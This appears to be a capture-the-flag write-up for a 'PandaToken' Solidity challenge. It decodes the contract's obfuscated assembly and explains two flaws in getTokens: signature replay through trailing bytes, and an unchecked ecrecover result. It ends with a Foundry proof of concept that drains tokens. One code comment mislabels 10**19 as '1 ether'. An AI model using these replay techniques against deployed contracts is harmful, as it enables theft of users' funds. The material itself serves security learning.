# Analysis:
### Storage slots:
The storage layout can be printed with `solc --storage-layout ...`, a list of used slots and corresponding variables:
  - slot 0: `ERC20._balances`
  - slot 5: `Ownable._owner`
  - slot 6: `PandaToken.c1`
  - slot 7: `PandaToken.usedSignatures`

### The function `calculateAmount()`:
It reads slot 6, which is variable `c1`, assigned with value 400 in constructor.

Just by replacing variables, the function can be simplified to:
```solidity
    function calculateAmount2(
        uint arg
    ) public pure returns (uint) {
        uint ret;
        assembly {
            ret := div(mul(arg, 1000), 1000)
        }
        return ret;
    }

```
It simply does nothing, just returns the argument. (overflow is not concerned here)

### The constructor:


```solidity
    let ptr := mload(0x40) // 0x40: get the free memory pointer, ptr = 0x100
    mstore(ptr, sload(mul(1, 110))) // mem[ptr] = 0, because store[110] == 0
    mstore(add(ptr, 0x20), 0) // mem[ptr+0x20] = 0
    let slot := keccak256(ptr, 0x40) // slot = sha3(zero_address + slot_0 of `ERC20._balances`)

    sstore(slot, exp(10, add(4, mul(3, 5)))) // store[slot] = 10**19 => _balances[0] = 1 ether
```
The first 4 lines write 0x40 zeroes to ptr, followed by a `keccak256`, it's calculating a mapping slot, the slot is calulated like: `keccak256(address, slot)`, so:
1. The address is 0
2. The slot is zero, hence it is `ERC20._balances`.

It's equivalent to `_balances[0]`, and stores 10**19(10 ether) in that slot.

```solidity
    sstore(6, _c1) // c1 == 400
```
This line stores 400 to the variable `c1`, which is passed in contructor.

```solidity
    mstore(ptr, sload(5)) // slot 5 is 'Ownable._owner',  mem[ptr] = owner
    mstore(add(ptr, 0x20), 0) // mem[ptr+0x20] = 0
    let slot1 := keccak256(ptr, 0x40) // slot1 = sha3(owner, slot_0 of `ERC20._balances`)

        // these two lines are doing cleanup, which are useless
        // mstore(ptr, sload(7)) // sizeof 'usedSignatures' == 0, mem[ptr] = 0
        // mstore(add(ptr, 0x20), 0) // mem[ptr+0x20] = 0

    sstore(slot1, mul(sload(slot), 2)) // _balances[owner] = 2 * _balances[0]
```
The 4 lines update owner's balance, setting it to `2 * balanceOf(0)`.

After the constructor is called:
 - `balanceOf(owner)`:  20 ether
 - `balanceOf(0)`: 10 ether


### Function `getTokens(amount, signature)`:
It uses the signature to recover the address, there're two problems:
1. It only uses the first 0x41 bytes of the signature, but it caches and compares with the whole signature bytes. So solution 1 is: 

 - Send multiple request with a fixed 0x41 bytes and some different trailing bytes to bypass the check of "used signature", and steal token from `owner`.

2. It doesn't verify the result of `ecrecover`, if the signature is wrong, the `ecrecover` can return 0.
We don't even need to provide a correct 0x41 bytes, so solution 2: 

 - Send different bytes as signature, steal token from the `address(0)`.


# POC (Foundry)
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8;

import "forge-std/Test.sol";
import "src/PandaToken.sol";


contract Hack is Test {
    PandaToken pandatoken;
    address owner = vm.addr(1);
    address hacker = vm.addr(2);

    function setUp() external {
        vm.prank(owner);
        pandatoken = new PandaToken(400, "PandaToken", "PND");
    }

    function test() public {
        vm.startPrank(hacker);
        bytes32 hash = keccak256(abi.encode(hacker, 1 ether));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(1, hash);

        // solution

		// method 1. get token from owner
		//   the first 0x41 bytes must be correct
		{
			bytes memory signature = abi.encodePacked(r, s, v);
			pandatoken.getTokens(1 ether, signature);
		}
		{
			bytes memory signature = abi.encodePacked(r, s, v, uint(1));
			pandatoken.getTokens(1 ether, signature);
		}
		{
			bytes memory signature = abi.encodePacked(r, s, v, uint(2));
			pandatoken.getTokens(1 ether, signature);
		}

		// method 2. get token from address(0)
		//   just send any bytes to it, as long as it's different
		//
		// for (uint i=0; i<3; i++) {
		// 	bytes memory signature = abi.encodePacked(i, i, i);
		// 	pandatoken.getTokens(1 ether, signature);
		// }

        assertEq(pandatoken.balanceOf(hacker), 3 ether);
    }
}

```
